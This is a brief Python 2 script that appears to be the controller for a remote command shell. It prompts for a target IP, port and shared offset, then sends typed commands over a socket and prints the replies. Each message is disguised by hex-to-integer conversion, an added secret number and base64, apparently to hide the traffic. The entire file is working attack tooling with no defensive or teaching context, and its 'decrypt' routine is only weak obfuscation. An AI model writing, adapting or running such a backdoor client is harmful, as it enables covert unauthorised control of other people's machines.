import socket
import sys
from base64 import b64encode, b64decode
import base64
import binascii

target_ip = raw_input("Enter the target IP: ")
port = raw_input("Enter the target port: ")
random = raw_input("Enter the random number:")
random = int(random)
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((target_ip, int(port)))

while True:
	data = raw_input("Enter command: ")
	hexcode= data.encode('hex')
	hexdec = int(hexcode, 16)
	encoded_cipher = hexdec + random
	encode = b64encode(str(encoded_cipher))
	client.send(encode)
	from_server = client.recv(4096)
	
	
	try:
		# decrypt part
		cipher = b64decode(from_server)
		cipher = int(cipher) - random
		dechex = '{0:x}'.format(int(cipher))
		hexdecode = dechex.decode('hex')
		print hexdecode
	
	except:
		pass
